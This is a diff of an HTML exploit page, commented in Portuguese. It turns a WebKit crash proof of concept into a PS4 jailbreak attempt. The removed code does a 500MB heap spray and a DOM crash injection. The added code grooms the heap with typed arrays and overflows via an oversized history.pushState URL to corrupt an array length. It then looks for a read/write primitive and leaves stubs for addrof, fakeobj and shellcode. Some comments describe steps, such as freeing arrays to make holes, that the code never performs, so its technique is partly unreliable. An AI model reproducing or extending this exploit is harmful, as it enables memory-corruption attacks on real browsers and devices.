@@ -1,95 +1,137 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC HackerOne Refined: Spray + Crash</title>
+    <title>PS4 WebKit RCE Strategy: Length Overwrite</title>
     <style>
-        body { background-color: #000; color: #ff0000; font-family: monospace; }
-        .log { border: 1px solid #555; padding: 10px; margin-top: 20px; color: #0f0; }
+        body { background-color: #1a1a1a; color: #00ff00; font-family: monospace; }
+        .log { border: 1px solid #444; padding: 10px; height: 400px; overflow-y: scroll; background: #000; }
     </style>
 </head>
 <body>
-    <h1>TARGET: 709,522 Bytes Trigger</h1>
-    <h3>Status: Preparando Heap Spray...</h3>
-    <div id="logArea" class="log"></div>
+    <h1>Heap Feng Shui: 0x01 Overwrite</h1>
+    <h3>Alvo: Transformar Overflow em Read/Write</h3>
+    <button onclick="runExploit()">INICIAR ALINHAMENTO E OVERFLOW</button>
+    <div id="logger" class="log"></div>
 
     <script>
-        // CONFIGURAÇÃO DA SUA POC ORIGINAL
-        // Mantenha o tamanho exato que causa o crash
-        const TRIGGER_SIZE = 709522; 
-        
-        // O caractere que causa a falha (0x09 = TAB, 0x0C = FORM FEED)
-        // Se a sua POC original usa outro, altere aqui.
-        const TRIGGER_CHAR = String.fromCharCode(0x09); 
+        const logArea = document.getElementById('logger');
+        function log(msg) { 
+            logArea.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`; 
+            logArea.scrollTop = logArea.scrollHeight;
+        }
 
-        const logger = document.getElementById('logArea');
-        function log(msg) { logger.innerHTML += "<div>[+] " + msg + "</div>"; }
+        // PARÂMETROS DA SUA POC
+        const VULN_BUFFER_SIZE = 709522; 
+        // Reduzimos o overflow para NÃO destruir tudo, apenas o cabeçalho do vizinho
+        // O Header de um objeto JS geralmente tem 8 a 16 bytes. 
+        // Vamos escrever o suficiente para pegar o campo "Length" ou "Butterfly".
+        const OVERFLOW_SIZE = 128; 
 
-        // --- PASSO 1: HEAP SPRAY ---
-        // O objetivo é encher a memória RAM com dados conhecidos (0x41414141...)
-        // Se o crash desviar o fluxo para um endereço aleatório, queremos que ele caia aqui.
-        var spray = [];
-        
-        function runSpray() {
-            log("Iniciando Heap Spray (Preenchendo RAM)...");
-            
-            try {
-                // Criamos um bloco grande de dados (1MB)
-                // 0x90 é NOP (No Operation) em Assembly x86/x64. 
-                // É o padrão para 'deslizar' até o exploit.
-                var blockSize = 1024 * 1024;
-                var buffer = new ArrayBuffer(blockSize);
-                var view = new Uint32Array(buffer);
-                
-                // Preenche com 0x90909090 (NOPs) ou 0x41414141 (As)
-                for (var i = 0; i < view.length; i++) {
-                    view[i] = 0x41414141; // Substituir por Shellcode real futuramente
-                }
+        var arrays = [];
+        var pressure = [];
 
-                // Aloca 500MB de memória com esse padrão
-                for (var i = 0; i < 500; i++) {
-                    spray.push(buffer.slice(0)); 
-                }
-                
-                log("Heap Spray Completo: ~500MB alocados.");
-                
-            } catch (e) {
-                log("Aviso: Memória quase cheia (Isso é bom).");
+        function runExploit() {
+            log("1. Iniciando Heap Feng Shui...");
+
+            // PASSO A: Defragmentação e Spray
+            // Criamos muitos Arrays Typed (Uint32Array) para alinhar a memória
+            // O objetivo é ter: [ARRAY] [ARRAY] [ARRAY]
+            for (let i = 0; i < 1000; i++) {
+                // Tamanho arbitrário, mas suficiente para ser um objeto no Heap
+                let arr = new Uint32Array(0x1000); 
+                // Marcamos o array para reconhecê-lo depois
+                arr[0] = 0x41414141; 
+                arr[1] = i; 
+                arrays.push(arr);
             }
+            log(`Spray concluído: ${arrays.length} arrays criados.`);
+
+            // PASSO B: Criar o "Buraco" (The Hole)
+            // Precisamos liberar espaço para que o buffer do pushState caia EXATAMENTE
+            // antes de um dos nossos arrays.
+            // Vamos deletar arrays intercalados para criar buracos.
+            log("2. Criando buracos para o payload...");
             
-            // Pequeno delay para garantir que a memória assentou
-            setTimeout(triggerCrash, 1000);
-        }
-
-        // --- PASSO 2: O GATILHO (A SUA POC) ---
-        function triggerCrash() {
-            log(`Construindo String da Morte (${TRIGGER_SIZE} bytes)...`);
+            // Liberamos arrays a cada 2 posições. 
+            // Esperamos que o Heap fique: [LIVRE] [ARRAY VÍTIMA] [LIVRE] [ARRAY VÍTIMA]
+            // O buraco precisa ser grande o suficiente para caber o VULN_BUFFER_SIZE
             
-            // Constrói a string exata do report
-            // Usamos array join que é mais rápido e eficiente em memória para construção
-            var payload = new Array(TRIGGER_SIZE + 1).join(TRIGGER_CHAR);
+            // NOTA: Para alinhar 709KB, precisamos forçar o GC ou ter alocado strings desse tamanho antes.
+            // Aqui vamos tentar uma abordagem bruta: liberar blocos grandes.
+            
+            // Vamos criar uma string temporária grande e soltar, esperando que o pushState re-use o espaço.
+            var tempHole = [];
+            for(let i=0; i < 50; i++) {
+                // String de tamanho idêntico ao alvo para treinar o allocator
+                let s = new Array(VULN_BUFFER_SIZE).join("B");
+                tempHole.push(s);
+            }
+            // Solta tudo de uma vez
+            tempHole = null; 
+            
+            // Força GC (Garbage Collection) rudimentar
+            try { new ArrayBuffer(1024 * 1024 * 100); } catch(e){}
 
-            log("PAYLOAD PRONTO. EXECUTANDO EM 3 SEGUNDOS...");
-            log("Se o console desligar ou der tela azul, o Spray pode ter funcionado.");
-
+            log("3. Preparando Payload Malicioso...");
+            
             setTimeout(() => {
-                // AQUI É O PONTO CRÍTICO
-                // Tentamos injetar isso onde o navegador processa (DOM ou Váriavel)
+                // O PAYLOAD DE ATAQUE
+                const base = "A".repeat(VULN_BUFFER_SIZE);
                 
-                // TENTATIVA A: Injeção no DOM (Renderização)
-                var div = document.createElement('div');
-                div.innerHTML = payload; 
-                document.body.appendChild(div);
+                // O OVERFLOW: 
+                // Usamos 0x01. Se acertarmos o campo "length" de um Uint32Array vizinho:
+                // Length original: 0x00001000
+                // Length novo:     0x01010101 (dec: 16843009) -> ACESSO GIGANTE!
+                const overflow = "\x01".repeat(OVERFLOW_SIZE);
+                
+                // Removemos o "AAAA" final da sua POC original porque ele causa crash.
+                // Queremos apenas sobrescrever silenciosamente.
+                const finalPayload = "/" + base + overflow;
 
-                // TENTATIVA B (Se A não crashar): Manipulação de String pura
-                // var crash = payload.trim(); // Força processamento
-                // var len = payload.split(TRIGGER_CHAR).length;
+                log("4. DISPARANDO history.pushState...");
+                try {
+                    history.pushState({}, "pwn", finalPayload);
+                } catch(e) {
+                    log("Erro no pushState (esperado se for muito grande): " + e.message);
+                }
 
-            }, 3000);
+                log("5. Verificando corrupção nos Arrays vizinhos...");
+                checkCorruption();
+
+            }, 1000);
         }
 
-        // Inicia o processo automaticamente
-        setTimeout(runSpray, 1500);
+        function checkCorruption() {
+            let found = false;
+            // Percorre todos os arrays que sobraram
+            for (let i = 0; i < arrays.length; i++) {
+                let arr = arrays[i];
+                if (!arr) continue;
 
+                // SE O EXPLOIT FUNCIONOU:
+                // O tamanho do array deve ter mudado magicamente para algo enorme (devido aos 0x01)
+                // O tamanho original era 0x1000 (4096).
+                if (arr.length > 0x1000) {
+                    log(`<span style='color:red; font-weight:bold;'>BINGO! Array índice ${i} corrompido!</span>`);
+                    log(`Novo tamanho: ${arr.length}`);
+                    log("Temos RW Primitive! Iniciando fase de Shellcode...");
+                    found = true;
+                    
+                    // AQUI ENTRARIA O CÓDIGO FINAL DO JAILBREAK
+                    // setupAddrof(arr);
+                    // setupFakeObj(arr);
+                    break;
+                }
+            }
+
+            if (!found) {
+                log("Falha: Nenhum array teve o tamanho alterado.");
+                log("Tente ajustar o 'OVERFLOW_SIZE' ou a estratégia de Spray.");
+                
+                // Se não crashou e não funcionou, talvez precisemos de mais bytes para chegar no vizinho
+                log("O navegador ainda está vivo. Tente rodar novamente.");
+            }
+        }
     </script>
 </body>
 </html>
